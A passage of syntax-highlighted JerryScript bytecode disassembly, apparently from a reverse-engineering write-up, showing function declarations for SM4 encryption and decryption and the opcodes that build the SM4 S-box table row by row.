class="number">15</span>-&gt;string(encrypt)</span><br><span class="line">  <span class="attribute">66</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">99</span> ident:<span class="number">16</span>-&gt;string(decrypt_sm4)</span><br><span class="line">  <span class="attribute">69</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">100</span> ident:<span class="number">17</span>-&gt;string(compare_array)</span><br><span class="line">  <span class="attribute">72</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">18</span>-&gt;string(input)</span><br><span class="line">  <span class="attribute">74</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line">  <span class="attribute">76</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">20</span>-&gt;string(message)</span><br><span class="line">  <span class="attribute">78</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">21</span>-&gt;string(count)</span><br><span class="line">  <span class="attribute">80</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">22</span>-&gt;string(pad_len)</span><br><span class="line">  <span class="attribute">82</span> : CBC_PUSH_LITERAL ident:<span class="number">23</span>-&gt;string(Array)</span><br><span class="line">  <span class="attribute">84</span> : CBC_NEW0</span><br><span class="line">  <span class="attribute">85</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">5</span>-&gt;string(SboxTable)</span><br><span class="line">  <span class="attribute">87</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_0 ident:<span class="number">5</span>-&gt;string(SboxTable)</span><br><span class="line">  <span class="attribute">89</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">214</span></span><br><span class="line">  <span class="attribute">92</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">144</span></span><br><span class="line">  <span class="attribute">94</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">233</span></span><br><span class="line">  <span class="attribute">96</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">254</span></span><br><span class="line">  <span class="attribute">98</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">204</span></span><br><span class="line"> <span class="attribute">100</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">225</span></span><br><span class="line"> <span class="attribute">102</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">61</span></span><br><span class="line"> <span class="attribute">104</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">183</span></span><br><span class="line"> <span class="attribute">106</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">22</span></span><br><span class="line"> <span class="attribute">108</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">182</span></span><br><span class="line"> <span class="attribute">110</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">20</span></span><br><span class="line"> <span class="attribute">112</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">194</span></span><br><span class="line"> <span class="attribute">114</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">40</span></span><br><span class="line"> <span class="attribute">116</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">251</span></span><br><span class="line"> <span class="attribute">118</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">44</span></span><br><span class="line"> <span class="attribute">120</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">5</span></span><br><span class="line"> <span class="attribute">122</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">124</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">125</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">1</span></span><br><span class="line"> <span class="attribute">128</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">43</span></span><br><span class="line"> <span class="attribute">131</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">103</span></span><br><span class="line"> <span class="attribute">133</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">154</span></span><br><span class="line"> <span class="attribute">135</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">118</span></span><br><span class="line"> <span class="attribute">137</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">42</span></span><br><span class="line"> <span class="attribute">139</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">190</span></span><br><span class="line"> <span class="attribute">141</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">4</span></span><br><span class="line"> <span class="attribute">143</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">195</span></span><br><span class="line"> <span class="attribute">145</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">170</span></span><br><span class="line"> <span class="attribute">147</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">68</span></span><br><span class="line"> <span class="attribute">149</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">19</span></span><br><span class="line"> <span class="attribute">151</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">38</span></span><br><span class="line"> <span class="attribute">153</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">73</span></span><br><span class="line"> <span class="attribute">155</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">134</span></span><br><span class="line"> <span class="attribute">157</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">6</span></span><br><span class="line"> <span class="attribute">159</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">153</span></span><br><span class="line"> <span class="attribute">161</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">163</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">164</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">2</span></span><br><span class="line"> <span class="attribute">167</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">156</span></span><br><span class="line"> <span class="attribute">170</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">66</span></span><br><span class="line"> <span class="attribute">172</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">80</span></span><br><span class="line"> <span class="attribute">174</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">244</span></span><br><span class="line"> <span class="attribute">176</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">145</span></span><br><span class="line"> <span class="attribute">178</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">239</span></span><br><span class="line"> <span class="attribute">180</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">152</span></span><br><span class="line"> <span class="attribute">182</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">122</span></span><br><span class="line"> <span class="attribute">184</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">51</span></span><br><span class="line"> <span class="attribute">186</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">84</span></span><br><span class="line"> <span class="attribute">188</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">11</span></span><br><span class="line"> <span class="attribute">190</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">67</span></span><br><span class="line"> <span class="attribute">192</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">237</span></span><br><span class="line"> <span class="attribute">194</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">207</span></span><br><span class="line"> <span class="attribute">196</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">172</span></span><br><span class="line"> <span class="attribute">198</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">98</span></span><br><span class="line"> <span class="attribute">200</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">202</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">203</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">3</span></span><br><span class="line"> <span class="attribute">206</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">228</span></span><br><span class="line"> <span class="attribute">209</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">179</span></span><br><span class="line"> <span class="attribute">211</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">28</span></span><br><span class="line"> <span class="attribute">213</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">169</span></span><br><span class="line"> <span class="attribute">215</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">201</span></span><br><span class="line"> <span class="attribute">217</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">8</span></span><br><span class="line"> <span class="attribute">219</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">232</span></span><br><span class="line"> <span class="attribute">221</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">149</span></span><br><span class="line"> <span class="attribute">223</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">128</span></span><br><span class="line"> <span class="attribute">225</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">223</span></span><br><span class="line"> <span class="attribute">227</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">148</span></span><br><span class="line"> <span class="attribute">229</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">250</span></span><br><span class="line"> <span class="attribute">231</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">117</span></span><br><span class="line"> <span class="attribute">233</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">143</span></span><br><span class="line"> <span class="attribute">235</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">63</span></span><br><span class="line"> <span class="attribute">237</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">166</span></span><br><span class="line"> <span class="attribute">239</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">241</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">242</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">4</span></span><br><span class="line"> <span class="attribute">245</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">71</span></span><br><span class="line"> <span class="attribute">248</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">7</span></span><br><span class="line"> <span class="attribute">250</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">167</span></span><br><span class="line"> <span class="attribute">252</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">252</span></span><br><span class="line"> <span class="attribute">254</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">243</span></span><br><span class="line"> <span class="attribute">256</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">115</span></span><br><span class="line"> <span class="attribute">258</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">23</span></span><br><span class="line"> <span class="attribute">260</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">186</span></span><br><span class="line"> <span class="attribute">262</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">131</span></span><br><span class="line"> <span class="attribute">264</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">89</span></span><br><span class="line"> <span class="attribute">266</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">60</span></span><br><span class="line"> <span class="attribute">268</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">25</span></span><br><span class="line"> <span class="attribute">270</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">230</span></span><br><span class="line"> <span class="attribute">272</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">133</span></span><br><span class="line"> <span class="attribute">274</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">79</span></span><br><span class="line"> <span class="attribute">276</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">168</span></span><br><span class="line"> <span class="attribute">278</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">280</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">281</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">5</span></span><br><span class="line"> <span class="attribute">284</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">104</span></span><br><span class="line"> <span class="attribute">287</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">107</span></span><br><span class="line"> <span class="attribute">289</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">129</span></span><br><span class="line"> <span class="attribute">291</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">178</span></span><br><span class="line"> <span class="attribute">293</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">113</span></span><br><span class="line"> <span class="attribute">295</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">100</span></span><br><span class="line"> <span class="attribute">297</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">218</span></span><br><span class="line"> <span class="attribute">299</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">139</span></span><br><span class="line"> <span class="attribute">301</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">248</span></span><br><span class="line"> <span class="attribute">303</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">235</span></span><br><span class="line"> <span class="attribute">305</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">15</span></span><br><span class="line"> <span class="attribute">307</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">75</span></span><br><span class="line"> <span class="attribute">309</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">112</span></span><br><span class="line"> <span class="attribute">311</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">86</span></span><br><span class="line"> <span class="attribute">313</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">157</span></span><br><span class="line"> <span class="attribute">315</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">53</span></span><br><span class="line"> <span class="attribute">317</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">319</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">320</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">6</span></span><br><span class="line"> <span class="attribute">323</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">30</span></span><br><span class="line"> <span class="attribute">326</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">36</span></span><br><span class="line"> <span class="attribute">328</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">14</span></span><br><span class="line"> <span class="attribute">330</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">94</span></span><br><span class="line"> <span class="attribute">332</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">99</span></span><br><span class="line"> <span class="attribute">334</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">88</span></span><br><span class="line"> <span class="attribute">336</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">209</span></span><br><span class="line"> <span class="attribute">338</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">162</span></span><br><span class="line"> <span class="attribute">340</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">37</span></span><br><span class="line"> <span class="attribute">342</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">34</span></span><br><span class="line"> <span class="attribute">344</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">124</span></span><br><span class="line"> <span class="attribute">346</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">59</span></span><br><span class="line"> <span class="attribute">348</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">1</span></span><br><span class="line"> <span class="attribute">350</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">33</span></span><br><span class="line"> <span class="attribute">352</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">120</span></span><br><span class="line"> <span class="attribute">354</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">135</span></span><br><span class="line"> <span class="attribute">356</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">358</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">359</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">7</span></span><br><span class="line"> <span class="attribute">362</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">212</span></span><br><span class="line"> <span class="attribute">365</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">366</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">70</span></span><br><span class="line"> <span class="attribute">368</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">87</span></span><br><span class="line"> <span class="attribute">370</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">159</span></span><br><span class="line"> <span class="attribute">372</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">211</span></span><br><span class="line"> <span class="attribute">374</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">39</span></span><br><span class="line"> <span class="attribute">376</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">82</span></span><br><span class="line"> <span class="attribute">378</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">76</span></span><br><span class="line"> <span class="attribute">380</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">54</span></span><br><span class="line"> <span class="attribute">382</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">2</span></span><br><span class="line"> <span class="attribute">384</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">231</span></span><br><span class="line"> <span class="attribute">386</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">160</span></span><br><span class="line"> <span class="attribute">388</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">196</span></span><br><span class="line"> <span class="attribute">390</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">200</span></span><br><span class="line"> <span class="attribute">392</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">158</span></span><br><span class="line"> <span class="attribute">394</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">396</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">397</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">8</span></span><br><span class="line"> <span class="attribute">400</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">234</span></span><br><span class="line"> <span class="attribute">403</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">191</span></span><br><span class="line"> <span class="attribute">405</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">138</span></span><br><span class="line"> <span class="attribute">407</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">210</span></span><br><span class="line"> <span class="attribute">409</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">64</span></span><br><span class="line"> <span class="attribute">411</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">199</span></span><br><span class="line"> <span class="attribute">413</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">56</span></span><br><span class="line"> <span class="attribute">415</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">181</span></span><br><span class="line"> <span class="attribute">417</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">163</span></span><br><span class="line"> <span class="attribute">419</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">247</span></span><br><span class="line"> <span class="attribute">421</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">242</span></span><br><span class="line"> <span class="attribute">423</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">206</span></span><br><span class="line"> <span class="attribute">425</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">249</span></span><br><span class="line"> <span class="attribute">427</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">97</span></span><br><span class="line"> <span class="attribute">429</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">21</span></span><br><span class="line"> <span class="attribute">431</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">161</span></span><br><span class="line"> <span class="attribute">433</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">435</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">436</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">9</span></span><br><span class="line"> <span class="attribute">439</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">224</span></span><br><span class="line"> <span class="attribute">442</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">174</span></span><br><span class="line"> <span class="attribute">444</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">93</span></span><br><span class="line"> <span class="attribute">446</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">164</span></span><br><span class="line"> <span class="attribute">448</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">155</span></span><br><span class="line"> <span class="attribute">450</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">52</span></span><br><span class="line"> <span class="attribute">452</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">26</span></span><br><span class="line"> <span class="attribute">454</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">85</span></span><br><span class="line"> <span class="attribute">456</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">173</span></span><br><span class="line"> <span class="attribute">458</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">147</span></span><br><span class="line"> <span class="attribute">460</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">50</span></span><br><span class="line"> <span class="attribute">462</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">48</span></span><br><span class="line"> <span class="attribute">464</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">245</span></span><br><span class="line"> <span class="attribute">466</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">140</span></span><br><span class="line"> <span class="attribute">468</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">177</span></span><br><span class="line"> <span class="attribute">470</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">227</span></span><br><span class="line"> <span class="attribute">472</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">474</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">475</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">10</span></span><br><span class="line"> <span class="attribute">478</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">29</span></span><br><span class="line"> <span class="attribute">481</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">246</span></span><br><span class="line"> <span class="attribute">483</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">226</span></span><br><span class="line"> <span class="attribute">485</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">46</span></span><br><span class="line"> <span class="attribute">487</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">130</span></span><br><span class="line"> <span class="attribute">489</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">102</span></span><br><span class="line"> <span class="attribute">491</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">202</span></span><br><span class="line"> <span class="attribute">493</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">96</span></span><br><span class="line"> <span class="attribute">495</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">192</span></span><br><span class="line"> <span class="attribute">497</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">41</span></span><br><span class="line"> <span class="attribute">499</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">35</span></span><br><span class="line"> <span class="attribute">501</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">171</span></span><br><span class="line"> <span class="attribute">503</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">13</span></span><br><span class="line"> <span class="attribute">505</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">83</span></span><br><span class="line"> <span class="attribute">507</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">78</span></span><br><span class="line"> <span class="attribute">509</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">111</span></span><br><span class="line"> <span class="attribute">511</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">513</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">514</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">11</span></span><br><span class="line"> <span class="attribute">517</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">213</span></span><br><span class="line"> <span class="attribute">520</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">219</span></span><br><span class="line"> <span class="attribute">522</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">55</span></span><br><span class="line"> <span class="attribute">524</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">69</span></span><br><span class="line"> <span class="attribute">526</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">222</span></span><br><span class="line"> <span class="attribute">528</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">253</span></span><br><span class="line"> <span class="attribute">530</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">142</span></span><br><span class="line"> <span class="attribute">532</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">47</span></span><br><span class="line"> <span class="attribute">534</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">3</span></span><br><span class="line"> <span class="attribute">536</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">255</span></span><br><span class="line"> <span class="attribute">538</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">106</span></span><br><span class="line"> <span class="attribute">540</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">114</span></span><br><span class="line"> <span class="attribute">542</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">109</span></span><br><span class="line"> <span class="attribute">544</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">108</span></span><br><span class="line"> <span class="attribute">546</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">91</span></span><br><span class="line"> <span class="attribute">548</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">81</span></span><br><span class="line"> <span class="attribute">550</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">552</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">553</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">12</span></span><br><span class="line"> <span class="attribute">556</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">141</span></span><br><span class="line"> <span class="attribute">559</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">27</span></span><br><span class="line"> <span class="attribute">561</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">175</span></span><br><span class="line"> <span class="attribute">563</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">146</span></span><br><span class="line"> <span class="attribute">565</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">187</span></span><br><span class="line"> <span class="attribute">567</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">221</span></span><br><span class="line"> <span class="attribute">569</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">188</span></span><br><span class="line"> <span class="attribute">571</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">127</span></span><br><span class="line"> <span class="attribute">573</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">17</span></span><br><span class="line"> <span class="attribute">575</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">217</span></span><br><span class="line"> <span class="attribute">577</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">92</span></span><br><span class="line"> <span class="attribute">579</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">65</span></span><br><span class="line"> <span class="attribute">581</span> : 